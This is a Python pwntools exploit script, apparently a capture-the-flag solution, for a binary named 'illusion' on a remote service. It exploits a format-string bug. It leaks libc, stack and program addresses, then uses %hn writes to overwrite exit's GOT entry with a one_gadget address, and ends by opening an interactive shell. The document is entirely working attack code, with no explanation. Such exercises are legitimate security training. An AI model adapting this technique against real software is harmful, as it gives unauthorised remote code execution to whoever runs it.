#!/usr/bin/env python3
from pwn import *

# p = process('./illusion', env={"LD_PRELOAD" : "./libc.so.6"})
p = remote('eofqual.zoolab.org', 10104)

raw_input('>')
payload = b'|%p|%13$p|%15$p|'
p.sendline(payload)

p.recvuntil(b'|')
libc = int(p.recvuntil(b'|', drop=True), 16) - 0x1ec723
log.info('libc: ' + hex(libc))

stack = int(p.recvuntil(b'|', drop=True), 16)
log.info('stack: ' + hex(stack))

text = int(p.recvuntil(b'|', drop=True), 16) - 0x1211
log.info('text: ' + hex(text))

exit_got = text + 0x5018
one_gadget = libc + 0xe6e76
r10 = stack - 0x32f8

one_gadgets = []
idx = [0, 1, 2]
for i in range(3):
    one_gadgets.append((one_gadget >> (i * 16)) & 0xffff)

for i in range(3):
    for j in range(i + 1, 3):
        if one_gadgets[i] > one_gadgets[j]:
            tmp = one_gadgets[i]
            one_gadgets[i] = one_gadgets[j]
            one_gadgets[j] = tmp
            tmp = idx[i]
            idx[i] = idx[j]
            idx[j] = tmp

for i in range(2, 0, -1):
    one_gadgets[i] = one_gadgets[i] - one_gadgets[i - 1]

print(one_gadgets)
print(idx)

raw_input('>')
payload  = b'%17$n%18$n'

for i in range(3):
    payload += '%{}c%{}$hn'.format(one_gadgets[i], 14 + idx[i]).encode()
payload += b'a' * (8 * 8 - len(payload))
payload += p64(exit_got)
payload += p64(exit_got + 2)
payload += p64(exit_got + 4)
payload += p64(r10)
payload += p64(r10 + 4)
p.sendline(payload)

log.info(hex(exit_got))
log.info(hex(exit_got + 2))
log.info(hex(exit_got + 4))
log.info(hex(r10))

p.interactive()

# 0x6198
